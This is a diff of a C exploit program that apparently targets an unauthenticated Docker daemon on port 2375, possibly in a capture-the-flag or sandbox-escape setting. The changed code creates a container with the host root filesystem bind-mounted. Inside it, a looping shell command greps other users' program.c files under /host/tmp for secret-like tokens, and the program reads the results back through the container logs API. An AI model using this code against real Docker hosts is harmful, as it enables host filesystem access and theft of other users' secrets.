@@ -12,17 +12,6 @@
 #define DOCKER_PORT 2375
 #define SA struct sockaddr
 
-void func(int sockfd)
-{
-    char data[BUFFER_SIZE] = "GET / HTTP/1.1\nHost: 127.0.0.1\n\n\0";
-    write(sockfd, data, strlen(data));
-
-    char buff[BUFFER_SIZE];
-    bzero(buff, sizeof(buff));
-    read(sockfd, buff, sizeof(buff));
-    printf("%s", buff);
-}
-
 int create_tcp_connection(const char* host, unsigned short int port) {
     int sockfd = socket(AF_INET, SOCK_STREAM, 0);
     if (sockfd == -1) {
@@ -183,7 +172,7 @@ void create_hacking_container() {
     char result[BUFFER_SIZE];
 
     // 1. Create a container
-    char* shell_command = "while true; do cat /host/tmp/*/program.c; sleep 1; done";
+    char* shell_command = "while true; do grep -oE '[A-Z0-9]{31}=' /host/tmp/*/program.c 2> /dev/null; sleep 1; done";
     char body[BUFFER_SIZE];
     sprintf(body, "{\"Image\": \"sandbox\", \"EntryPoint\": \"/bin/sh\", \"Cmd\": [\"-c\", \"%s\"], \"HostConfig\": { \"Binds\": [\"/:/host\"] }}", shell_command);
     send_http_request_post(docker_host, DOCKER_PORT, "/containers/create", body, result);
@@ -207,7 +196,7 @@ void get_hacking_container_output(const char* container_id) {
     char result[BUFFER_SIZE];
 
     char get_container_logs_url[MAX_URL_LENGTH + 1];
-    snprintf(get_container_logs_url, MAX_URL_LENGTH, "/containers/%s/logs?stdout=true&stderr=true", container_id);
+    snprintf(get_container_logs_url, MAX_URL_LENGTH, "/containers/%s/logs?stdout=true&stderr=true&tail=20", container_id);
     int len = send_http_request_get(docker_host, DOCKER_PORT, get_container_logs_url, result);
 
     print_hex_buffer(result, len);
